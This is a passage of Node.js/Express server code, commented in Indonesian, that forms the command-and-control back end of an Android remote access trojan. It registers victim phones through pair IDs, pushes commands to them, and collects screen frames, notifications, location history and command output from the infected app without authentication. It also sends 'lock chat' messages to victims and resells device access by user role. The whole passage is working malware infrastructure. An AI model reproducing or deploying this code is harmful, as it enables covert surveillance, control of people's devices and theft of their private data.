  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '{}');
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  const role = (req._ratUser.role||'').toLowerCase();
  const isHighRole = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  // Jika yang dicek adalah diri sendiri dan role tinggi → auto approve
  if (isHighRole && (!username || username === req._ratUser.username)) {
    return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
  }
  const ownerPerms = perms[req._ratUser.username] || {};
  const targetPerm = ownerPerms[username] || { approved: false, allDevices: false, devices: [] };
  res.json({ valid: true, ...targetPerm });
});

app.post('/setDevicePerm', ratGuard, (req, res) => {
  const { username, approved, allDevices, devices } = req.body;
  const role = (req._ratUser.role||'').toLowerCase();
  const canSetPerm = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canSetPerm) return res.json({ valid: false, message: 'Role tidak diizinkan set permission' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][username] = { approved: !!approved, allDevices: !!allDevices, devices: devices||[] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/listDevicePerms', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canList = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  if (!canList) return res.json({ valid: false, message: 'Role tidak diizinkan' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  res.json({ valid: true, perms: perms[req._ratUser.username] || {} });
});

app.get('/api/device/getPerms',  ratGuard, (req, res) => { req.url = '/devicePerms?'   + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm',  ratGuard, (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', ratGuard, (req, res) => { req.url = '/listDevicePerms?'+(req.url.split('?')[1]||''); app.handle(req, res); });

// ── RAT Core Endpoints ──────────────────────────────────────────────────────
app.get('/rat/pairid', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === req._ratUser.username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  if (!db[idx].pairId) { db[idx].pairId = genPairId(); fs.writeFileSync('./database.json', JSON.stringify(db,null,2)); }
  res.json({ valid: true, pairId: db[idx].pairId });
});

app.post('/rat/grant-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canGrant = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  if (!canGrant) return res.json({ valid: false, message: 'Role tidak diizinkan grant akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][memberUsername] = { approved: true, allDevices: true, devices: [] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.post('/rat/revoke-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canRevoke = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  if (!canRevoke) return res.json({ valid: false, message: 'Role tidak diizinkan revoke akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (perms[req._ratUser.username]) delete perms[req._ratUser.username][memberUsername];
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/rat/my-devices', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const user = req._ratUser;
  const targets = readRat(RAT_TARGETS);
  const role = (user.role||'').toLowerCase();
  const isOwnerLevel = ['developer', 'high owner', 'owner', 'moderator', 'partner',].includes(role);
  const isAdminLevel = ['admin'].includes(role);
  const isResellerVip = ['reseller','vip'].includes(role);
  let devices;

  if (isOwnerLevel || isAdminLevel || isResellerVip) {
    // Semua role tinggi langsung pakai pairId sendiri → lihat device milik sendiri
    const dbUser = db.find(u => u.username === user.username);
    if (!dbUser) return res.json({ valid: true, devices: [] });
    // Auto-approve diri sendiri di rat_perms supaya APK tidak tampilkan "Akses belum disetujui"
    try {
      const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
      if (!perms[user.username]) perms[user.username] = {};
      if (!perms[user.username][user.username]) {
        perms[user.username][user.username] = { approved: true, allDevices: true, devices: [] };
        fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
      }
    } catch(_) {}
    devices = targets.filter(t => t.ownerPairId === dbUser.pairId);
  } else {
    // Member atau role lain → cek perms dari owner
    const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
    const ownerEntry = Object.entries(perms).find(([,p]) => p[user.username]?.approved);
    if (!ownerEntry) return res.json({ valid: true, devices: [] });
    const [ownerName, ownerPerms] = ownerEntry;
    const perm = ownerPerms[user.username];
    const ownerUser = db.find(u => u.username === ownerName);
    const ownerDevices = targets.filter(t => t.ownerPairId === ownerUser?.pairId);
    devices = perm.allDevices ? ownerDevices : ownerDevices.filter(d => perm.devices?.includes(d.id));
  }
  res.json({ valid: true, devices });
});

// ── Pair + Command + Response ────────────────────────────────────────────────
app.post('/api/pair-target', (req, res) => {
  // Endpoint ini dipanggil dari APK target (bukan dari user login), jadi pakai pairId bukan sessionKey
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'Missing fields' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const owner = db.find(u => u.pairId === pairId);
  if (!owner) return res.status(403).json({ error: 'Invalid pairId' });
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === deviceId);
  const entry = { id: deviceId, model: model||'Unknown', battery: battery||'?', ownerPairId: pairId, lastSeen: new Date().toISOString() };
  if (idx >= 0) t[idx] = { ...t[idx], ...entry }; else t.push(entry);
  saveRat(RAT_TARGETS, t);
  res.json({ valid: true, message: 'Paired' });
});

app.post('/api/send-command', ratGuard, (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.id !== id);
  cmds.push({ id, command, extra: extra||'', ts: Date.now() });
  saveRat('./rat_commands.json', cmds);
  res.json({ valid: true });
});

// ══════════════════════════════════════════════════════════════
// ══════ WRAPPER: /api/command-v2/:deviceId (auth ?key=) ══════
// ══════ Buat Flutter — kirim command via socket.io ══════
// ══════════════════════════════════════════════════════════════
app.post('/api/command-v2/:deviceId', ratGuard, (req, res) => {
  const { deviceId } = req.params;
  const { command, value } = req.body;

  if (!command) {
    return res.status(400).json({ valid: false, message: 'command required' });
  }

  try {
    const ioInstance = req.app.get('io');
    if (!ioInstance) {
      return res.status(500).json({ valid: false, message: 'Socket.io not ready' });
    }

    // Kirim ke device via socket.io (instan, ga pake polling)
    ioInstance.to(`device:${deviceId}`).emit('command', {
      command,
      value: value || ''
    });

    console.log(`[CMD-V2] ${command} → device ${deviceId}`);
    res.json({ valid: true, deviceId, command });
  } catch (e) {
    console.error('[CMD-V2] Error:', e.message);
    res.status(500).json({ valid: false, message: e.message });
  }
});

console.log('[CMD-V2] Endpoint terpasang: POST /api/command-v2/:deviceId');

// ═══════════════════════════════════════════════════════════════
// CONTROL PANEL: Endpoint tambahan buat command_service.dart
// ═══════════════════════════════════════════════════════════════

// Helper: resolve user dari token (header x-auth-token / query key / body key)
function _resolveUserFlexible(req) {
  const candidates = [
    req.headers['x-auth-token'],
    req.query.key,
    req.query.token,
    req.body?.key,
    req.body?.token,
  ].filter(Boolean);

  for (const c of candidates) {
    const info = activeKeys[c];
    if (info) {
      const db = loadDatabase();
      const user = db.find(u => u.username === info.username);
      if (user) return { key: c, info, user };
    }
  }
  return null;
}

// Cek boleh kontrol device
function _canControlDevice(user, deviceId) {
  const role = (user.role || 'member').toLowerCase();
  if (['developer','high owner','owner','moderator','partner','admin','vip'].includes(role)) return true;
  try {
    const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
    const ownerEntry = Object.entries(perms).find(([,p]) => p[user.username]?.approved);
    if (!ownerEntry) return false;
    const perm = ownerEntry[1][user.username];
    return perm.allDevices || (perm.devices || []).includes(deviceId);
  } catch { return false; }
}

// ── 1) POST /api/command/:deviceId ──
// Body: { command, value } — header x-auth-token = sessionKey
app.post('/api/command/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const { command, value } = req.body || {};

  const auth = _resolveUserFlexible(req);
  if (!auth) return res.status(401).json({ valid: false, error: 'INVALID_SESSION' });
  if (!command) return res.status(400).json({ valid: false, error: 'COMMAND_REQUIRED' });
  if (!_canControlDevice(auth.user, deviceId)) {
    return res.status(403).json({ valid: false, error: 'ACCESS_DENIED' });
  }

  const payload = {
    command,
    value: value ?? '',
    from: auth.user.username,
    ts: Date.now(),
  };

  let delivered = false;

  // Coba via socket dulu
  try {
    const ioInstance = req.app.get('io');
    if (ioInstance) {
      const room = ioInstance.sockets.adapter.rooms.get(`device:${deviceId}`);
      if (room && room.size > 0) {
        ioInstance.to(`device:${deviceId}`).emit('command', payload);
        delivered = true;
        console.log(`[CMD] ${command} → device:${deviceId} (${room.size} socket) by ${auth.user.username}`);
      }
    }
  } catch (e) { console.error('[CMD] socket err:', e.message); }

  // Fallback polling
  try {
    let cmds = readRat('./rat_commands.json');
    cmds = cmds.filter(c => c.id !== deviceId);
    cmds.push({ id: deviceId, ...payload, extra: value ?? '' });
    saveRat('./rat_commands.json', cmds);
  } catch (_) {}

  res.json({ valid: true, delivered, deviceId, command, via: delivered ? 'socket' : 'polling' });
});

// ── 2) POST /api/device/rename (format Flutter) + alias ──
function _handleRename(req, res) {
  const deviceId = req.params?.deviceId || req.body?.deviceId || req.body?.id;
  const newName  = req.body?.name || req.body?.newName;

  if (!deviceId) return res.status(400).json({ valid: false, error: 'DEVICE_ID_REQUIRED' });
  if (!newName)  return res.status(400).json({ valid: false, error: 'NAME_REQUIRED' });

  const auth = _resolveUserFlexible(req);
  if (!auth) return res.status(401).json({ valid: false, error: 'INVALID_SESSION' });

  try {
    const targets = readRat('./rat_targets.json');
    const idx = targets.findIndex(t => t.id === deviceId);
    if (idx < 0) return res.status(404).json({ valid: false, error: 'DEVICE_NOT_FOUND' });
    targets[idx].model = newName;
    targets[idx].customName = newName;
    saveRat('./rat_targets.json', targets);
    console.log(`[RENAME] ${deviceId} → ${newName} by ${auth.user.username}`);
    res.json({ valid: true, deviceId, name: newName });
  } catch (e) {
    res.status(500).json({ valid: false, error: e.message });
  }
}
app.post('/api/device/rename', _handleRename);
app.post('/api/device/:deviceId/rename', _handleRename);

// ── 3) GET /api/location/:deviceId ──
app.get('/api/location/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const auth = _resolveUserFlexible(req);
  if (!auth) return res.status(401).json({ valid: false, error: 'INVALID_SESSION' });
  if (!_canControlDevice(auth.user, deviceId)) {
    return res.status(403).json({ valid: false, error: 'ACCESS_DENIED' });
  }

  try {
    if (!fs.existsSync('./rat_locations.json')) {
      return res.json({ valid: true, deviceId, locations: [] });
    }
    const all = JSON.parse(fs.readFileSync('./rat_locations.json', 'utf8'));
    const locations = Array.isArray(all) ? all.filter(l => l.id === deviceId).slice(-200) : [];
    res.json({ valid: true, deviceId, locations });
  } catch (e) {
    res.json({ valid: true, deviceId, locations: [] });
  }
});

// ── 4) POST /api/chat/:deviceId (kirim chat ke victim) ──
app.post('/api/chat/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { text } = req.body || {};
  if (!text || typeof text !== 'string') {
    return res.status(400).json({ valid: false, error: 'TEXT_REQUIRED' });
  }

  const auth = _resolveUserFlexible(req);
  if (!auth) return res.status(401).json({ valid: false, error: 'INVALID_SESSION' });
  if (!_canControlDevice(auth.user, deviceId)) {
    return res.status(403).json({ valid: false, error: 'ACCESS_DENIED' });
  }

  try {
    let chats = readRat('./rat_chats.json');
    if (!Array.isArray(chats)) chats = [];
    chats.push({
      id: deviceId, from: auth.user.username,
      text: text.slice(0, 1000),
      time: new Date().toLocaleTimeString('id-ID'),
      ts: Date.now(),
    });
    if (chats.length > 500) chats = chats.slice(-500);
    saveRat('./rat_chats.json', chats);

    try {
      const ioInstance = req.app.get('io');
      if (ioInstance) ioInstance.to(`device:${deviceId}`).emit('lockChat', { text, from: auth.user.username });
    } catch (_) {}

    res.json({ valid: true, deviceId, sent: true });
  } catch (e) {
    res.status(500).json({ valid: false, error: e.message });
  }
});

console.log('[CMD] Control panel endpoints terpasang:');
console.log('  POST /api/command/:deviceId      (REST fallback)');
console.log('  POST /api/device/rename          (Flutter format)');
console.log('  POST /api/device/:deviceId/rename');
console.log('  GET  /api/location/:deviceId');
console.log('  POST /api/chat/:deviceId');

app.get('/api/get-command/:id', (req, res) => {
  // Dipanggil dari APK target, no auth needed
  let cmds = readRat('./rat_commands.json');
  const cmd = cmds.find(c => c.id === req.params.id);
  if (!cmd) return res.json({});
  cmds = cmds.filter(c => c.id !== req.params.id);
  saveRat('./rat_commands.json', cmds);
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === req.params.id);
  if (idx >= 0) { t[idx].lastSeen = new Date().toISOString(); saveRat(RAT_TARGETS, t); }
  res.json(cmd);
});

app.post('/api/post-response/:id', (req, res) => {
  // Dari APK target, no auth
  let resp = readRat('./rat_responses.json');
  resp = resp.filter(r => r.id !== req.params.id);
  resp.push({ id: req.params.id, cmd: req.body.cmd||'', data: req.body.data||{}, ts: Date.now() });
  saveRat('./rat_responses.json', resp);
  res.json({ valid: true });
});

app.get('/api/get-response/:id', ratGuard, (req, res) => {
  const resp = readRat('./rat_responses.json');
  const r = resp.find(r => r.id === req.params.id);
  res.json(r || {});
});

// ── Live Frame ───────────────────────────────────────────────────────────────
app.post('/api/live-frame/:id', (req, res) => {
  // Dari APK target, no auth
  const { frame, ts } = req.body;
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ valid: true });
});

app.get('/api/live-frame/:id', ratGuard, (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d || Date.now() - d.ts > 5000) return res.json({ frame: '' });
  res.json({ frame: d.frame });
});

// ── Notifications ────────────────────────────────────────────────────────────
app.post('/api/post-notification/:id', (req, res) => {
  // Dari APK target, no auth
  let notifs = readRat('./rat_notifs.json');
  notifs.push({ id: req.params.id, ...req.body, ts: Date.now() });
  if (notifs.length > 200) notifs = notifs.slice(-200);
  saveRat('./rat_notifs.json', notifs);
  res.json({ valid: true });
});

app.get('/api/get-notifications/:id', ratGuard, (req, res) => {
  const notifs = readRat('./rat_notifs.json');
  res.json(notifs.filter(n => n.id === req.params.id).slice(-50));
});

// ── Lock Chat ────────────────────────────────────────────────────────────────
app.post('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  if (!Array.isArray(chats)) chats = [];
  chats.push({ id: req.params.id, from: req.body.from||'owner', text: req.body.text||'', time: new Date().toLocaleTimeString('id-ID') });
  if (chats.length > 500) chats = chats.slice(-500);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

app.get('/api/lock-chat/:id', (req, res) => {
  // Dari APK target boleh baca chat
  const chats = readRat('./rat_chats.json');
  const last = chats.filter(c => c.id === req.params.id).slice(-1)[0];
  res.json(last || {});
});

app.get('/api/lock-chat-all/:id', ratGuard, (req, res) => {
  const chats = readRat('./rat_chats.json');
  res.json({ messages: chats.filter(c => c.id === req.params.id).slice(-100) });
});

app.delete('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  chats = chats.filter(c => c.id !== req.params.id);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

// ── Auto cleanup setiap jam ───────────────────────────────────────────────────
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  setInterval(() => {
    try {
      let data = readRat(`./${f}.json`);
      const now = Date.now();
      if (f === 'rat_commands')  data = data.filter(d => now - (d.ts||0) < 60000);
      if (f === 'rat_responses') data = data.filter(d => now - (d.ts||0) < 120000);
      saveRat(`./${f}.json`, data);
    } catch(_) {}
  }, 3600000);
});

// ── Admin RAT endpoints ──────────────────────────────────────────────────────
app.get('/admin/listpairids', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  res.json({ valid: true, users: db.map(u => ({ username: u.username, pairId: u.pairId||null })) });
});

app.get('/admin/genpairid', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  db[idx].pairId = genPairId();
  fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
  res.json({ valid: true, pairId: db[idx].pairId });
});

// ════════════════════════════════════════════════════════════════════════════
// ██████████  END RAT CONTROL SYSTEM  ████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════